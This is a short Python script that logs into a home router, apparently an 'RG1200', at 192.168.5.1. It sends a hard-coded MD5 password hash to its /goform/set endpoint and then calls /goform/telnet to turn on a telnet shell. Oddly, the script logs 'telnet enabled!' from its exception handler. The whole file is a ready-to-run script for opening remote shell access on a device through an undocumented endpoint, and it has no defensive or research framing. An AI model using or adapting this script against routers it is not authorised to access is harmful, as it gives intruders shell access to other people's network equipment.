import requests
import time
import logging
try:
    r = requests.post('http://192.168.5.1/goform/set', json={"login":{"pwd":"25d55ad283aa400af464c76d713c07ad"}})
    print(f"Status Code: {r.status_code}, Response: {r.json()}")
    r = requests.get('http://192.168.5.1/goform/telnet', timeout=10)
    print(r.text)
except Exception:
    logging.debug('RG1200 - telnet enabled!')
    time.sleep(1)


